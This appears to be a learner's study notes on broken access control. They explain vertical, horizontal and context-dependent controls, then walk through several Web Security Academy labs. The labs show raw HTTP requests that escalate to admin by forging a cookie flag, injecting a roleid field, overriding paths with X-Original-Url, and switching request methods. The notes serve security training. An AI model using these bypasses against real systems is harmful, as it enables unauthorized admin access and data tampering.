
Broken access controls are common and often present a critical security vulnerability. Design and management of access controls is a complex and dynamic problem that applies business, organizational, and legal constraints to a technical implementation. Access control design decisions have to be made by humans so the potential for errors is high.

ACCESS CONTROL TYPES:

1. Vertical Access Control
- Restricts access based on user roles
- Example: Admin vs normal user
- Attack: Accessing higher privilege functionality
- Example bug: User accessing /admin panel

2. Horizontal Access Control
- Restricts access between users
- Same role, different data
- Attack: Accessing another user's resources
- Example bug: Changing user ID (IDOR)

3. Context-Dependent Access Control
- Restricts actions based on application state
- Ensures correct sequence of operations

Key Difference:
- Vertical → privilege escalation (role-based)
- Horizontal → data access (user-based)
- Context -> Can I:

- Skip steps?
- Repeat actions?
- Do things out of order?

- “Am I trying to become admin?” → **Vertical**
- “Am I trying to access someone else’s data?” → **Horizontal**
- "It is about "when/how action is performed"" -> context

## Vertical privilege escalation LABS

#### Lab: Unprotected admin functionality

in robots.txt :

```
User-agent: *
Disallow: /administrator-panel

Meaning:
- All bots should avoid this path
- But humans can still access it
```

then i can access to /administrator-panel and delete carlos.

#### Lab: Unprotected admin functionality with unpredictable URL

i found script in the html code :

```
var isAdmin = false; 
if (isAdmin) { 
var topLinksTag = document.getElementsByClassName("top-links")[0]; 
var adminPanelTag = document.createElement('a'); adminPanelTag.setAttribute('href', '/admin-d43y8o'); 
adminPanelTag.innerText = 'Admin panel'; 
topLinksTag.append(adminPanelTag); 
var pTag = document.createElement('p'); 
pTag.innerText = '|'; 
topLinksTag.appendChild(pTag); 
}
```

this mean when the isAdmin is true then the it create a link of /admin-d43y8o and the admin can access to it but it is not protected. anyone can access it they know about the correct path, and delete a user carlos.

#### Lab: User role controlled by request parameter

when i do login into it some suspicious url is seen:

```
https://0a15007b03966acf818d756d00510053.web-security-academy.net/my-account?id=wiener
```

but i try other thing doesn't work now i inspect the cookie:

```
Admin: false
```

then i manipulate it and set to true. now i can access to the admin panel and delete carlos.

#### Lab: User role can be modified in user profile

login as the given credit. and in change-update section their we can modify the data of our own, so:

```
POST /my-account/change-email HTTP/2
Host: 0a7500580392221783a1562900c000cd.web-security-academy.net
Cookie: session=iPQ0ErMwPRiw62sGSCu6PFR3KuBnPyDi

{
	"email":"test@gmail.com",
	"roleid":2
}

Response:

{
  "username": "wiener",
  "email": "test@gmail.com",
  "apikey": "NIuWYbiLFS0BC7pGohyj8OgmKQ1Lp10F",
  "roleid": 2
}
```

now i get the access to admin panel and delete the user carlos.

#### Lab: URL-based access control can be circumvented

Some frameworks allow headers like `X-Original-URL`, `X-Rewrite-URL` to override the requested path. If access control is only applied to the visible URL, attackers can send a safe-looking request (like `/`) while forcing the backend to process a restricted path (like `/admin`), resulting in an access control bypass.

```
GET /?username=carlos HTTP/2
Host: 0ae700c404149b5a83af1e2100600052.web-security-academy.net
X-Original-Url: /admin/delete
Cookie: session=BbQknXA42GuUnPsaBvvw3mC19s053I0c
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae700c404149b5a83af1e2100600052.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

so i use this concept to bypass the restricted area.

#### Lab: Method-based access control can be circumvented


```
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0afd00db03e9c89a80fe6c1d002e0082.web-security-academy.net
Cookie: session=QN87MKGxS3EXw89U0ckRwB6b9HGXNnOt
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://0afd00db03e9c89a80fe6c1d002e0082.web-security-academy.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0afd00db03e9c89a80fe6c1d002e0082.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```





